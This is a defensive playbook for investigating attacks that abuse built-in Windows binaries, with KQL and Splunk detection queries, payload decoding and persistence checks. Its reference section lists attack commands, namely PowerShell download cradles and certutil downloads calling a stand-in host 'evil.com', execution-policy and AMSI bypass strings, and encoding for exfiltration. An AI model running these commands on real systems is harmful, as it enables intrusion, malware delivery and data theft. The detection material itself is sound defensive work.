Living off the Land (LOLBins) Investigation Playbook

Complete investigation workflow for attacks using legitimate system binaries for malicious purposes - PowerShell, certutil, mshta, rundll32, and more.

LOLBins Reference

PowerShell Abuse Patterns

Suspicious PowerShell Indicators
# Encoded commands (obfuscation)
powershell -enc [base64]
powershell -encodedcommand [base64]
powershell -e [base64]

# Download cradles
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.com/script.ps1')
IEX (iwr 'http://evil.com/script.ps1')

# Bypass execution policy
powershell -ep bypass
powershell -executionpolicy bypass
Set-ExecutionPolicy Bypass -Scope Process

# Hidden window
powershell -w hidden
powershell -windowstyle hidden

# AMSI bypass attempts
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
amsiInitFailed

certutil Abuse Patterns

certutil Malicious Usage
# Download file
certutil -urlcache -split -f http://evil.com/malware.exe C:\temp\malware.exe
certutil -urlcache -f http://evil.com/payload.txt C:\temp\payload.txt

# Decode base64 (used to decode downloaded payload)
certutil -decode encoded.txt decoded.exe

# Encode (used to exfiltrate data)
certutil -encode secret.txt encoded.txt

# Legitimate use (for comparison)
certutil -verify certificate.cer
certutil -store My

Investigation Steps

Step 1: Detect LOLBin Activity

KQL - Suspicious PowerShell Execution

// Detect encoded PowerShell commands
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where FileName =~ "powershell.exe" or FileName =~ "pwsh.exe"
| where ProcessCommandLine has_any (
    "-enc", "-encodedcommand", "-e ", 
    "-w hidden", "-windowstyle hidden",
    "-ep bypass", "-executionpolicy bypass",
    "IEX", "Invoke-Expression",
    "DownloadString", "DownloadFile",
    "Net.WebClient", "Invoke-WebRequest",
    "FromBase64String", "Reflection.Assembly"
)
| project TimeGenerated, DeviceName, AccountName, 
    ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc

KQL - certutil Download Detection

// Detect certutil being used to download files
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any (
    "-urlcache", "-split", "-f http", "-f https",
    "-decode", "-encode"
)
| project TimeGenerated, DeviceName, AccountName,
    ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc

KQL - Suspicious Process Parent-Child

// Detect unusual parent-child process relationships
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where InitiatingProcessFileName in~ (
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",  // Office
    "mshta.exe", "wscript.exe", "cscript.exe",  // Script hosts
    "wmiprvse.exe"  // WMI
)
| where FileName in~ (
    "powershell.exe", "cmd.exe", "certutil.exe", 
    "rundll32.exe", "regsvr32.exe", "msiexec.exe"
)
| project TimeGenerated, DeviceName, AccountName,
    InitiatingProcessFileName, FileName, ProcessCommandLine
| order by TimeGenerated desc

KQL - Comprehensive LOLBin Detection

// Detect multiple LOLBin categories
let SuspiciousCommands = DeviceProcessEvents
| where TimeGenerated > ago(24h)
| extend LOLBinType = case(
    // Download
    FileName =~ "certutil.exe" and ProcessCommandLine has "-urlcache", "Download-certutil",
    FileName =~ "bitsadmin.exe" and ProcessCommandLine has "/transfer", "Download-bitsadmin",
    FileName =~ "curl.exe" or FileName =~ "wget.exe", "Download-utility",
    // Execution proxy
    FileName =~ "mshta.exe" and ProcessCommandLine has "http", "Exec-mshta",
    FileName =~ "rundll32.exe" and ProcessCommandLine has_any ("javascript", "vbscript"), "Exec-rundll32",
    FileName =~ "regsvr32.exe" and ProcessCommandLine has "/i:http", "Exec-regsvr32",
    // Encoded PowerShell
    FileName =~ "powershell.exe" and ProcessCommandLine has "-enc", "PS-encoded",
    // WMI
    FileName =~ "wmic.exe" and ProcessCommandLine has "process call create", "WMI-execution",
    ""
)
| where LOLBinType != "";
SuspiciousCommands
| summarize Count = count(), Devices = make_set(DeviceName) by LOLBinType
| order by Count desc

SPL - LOLBin Detection (Splunk)

index=endpoint sourcetype=sysmon EventCode=1
| eval lolbin_type=case(
    match(process_name, "(?i)certutil\.exe") AND match(command_line, "(?i)urlcache"), "Download-certutil",
    match(process_name, "(?i)powershell\.exe") AND match(command_line, "(?i)-enc"), "PS-encoded",
    match(process_name, "(?i)mshta\.exe") AND match(command_line, "(?i)http"), "Exec-mshta",
    match(process_name, "(?i)rundll32\.exe") AND match(command_line, "(?i)javascript"), "Exec-rundll32",
    match(process_name, "(?i)wmic\.exe") AND match(command_line, "(?i)process call create"), "WMI-exec",
    true(), "other"
)
| where lolbin_type!="other"
| stats count by host, lolbin_type, process_name, command_line
| sort -count

Step 2: Decode and Analyze Payload

PowerShell - Decode Base64 Command

# Decode PowerShell encoded command
$encoded = "BASE64_STRING_HERE"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# If double-encoded
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decoded))

# CyberChef recipe for complex encoding:
# From Base64 → Remove null bytes → Decode text

KQL - Extract and Decode PowerShell

// Extract base64 from PowerShell commands
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has "-enc"
| extend EncodedPart = extract(@"-e[ncodedcommand]*\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
| where isnotempty(EncodedPart)
| extend DecodedCommand = base64_decode_tostring(EncodedPart)
| project TimeGenerated, DeviceName, EncodedPart, DecodedCommand

Step 3: Trace Full Attack Chain

KQL - Process Tree Analysis

// Build process tree for suspicious activity
let SuspiciousProcess = DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where ProcessCommandLine has "certutil" and ProcessCommandLine has "-urlcache"
| project DeviceName, SuspiciousProcessId = ProcessId, SuspiciousTime = TimeGenerated;
// Find parent processes
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| join kind=inner SuspiciousProcess on DeviceName
| where ProcessId == SuspiciousProcessId or InitiatingProcessId == SuspiciousProcessId
| project TimeGenerated, DeviceName, 
    ProcessName = FileName, 
    ProcessCommandLine,
    ParentProcess = InitiatingProcessFileName,
    ParentCommandLine = InitiatingProcessCommandLine
| order by TimeGenerated asc

Step 4: Check for Persistence

KQL - LOLBin in Persistence Mechanisms

// Check if LOLBins are used in persistence
union
(
    DeviceRegistryEvents
    | where TimeGenerated > ago(7d)
    | where RegistryKey has_any ("Run", "RunOnce", "Winlogon")
    | where RegistryValueData has_any ("powershell", "cmd", "mshta", "wscript", "certutil")
    | project TimeGenerated, DeviceName, Mechanism = "Registry", Details = RegistryValueData
),
(
    DeviceProcessEvents
    | where TimeGenerated > ago(7d)
    | where FileName =~ "schtasks.exe"
    | where ProcessCommandLine has_any ("powershell", "cmd", "mshta", "wscript")
    | project TimeGenerated, DeviceName, Mechanism = "ScheduledTask", Details = ProcessCommandLine
),
(
    DeviceFileEvents
    | where TimeGenerated > ago(7d)
    | where FolderPath has "Startup"
    | where FileName endswith ".bat" or FileName endswith ".cmd" or FileName endswith ".ps1"
    | project TimeGenerated, DeviceName, Mechanism = "StartupFolder", Details = FileName
)
| order by TimeGenerated desc
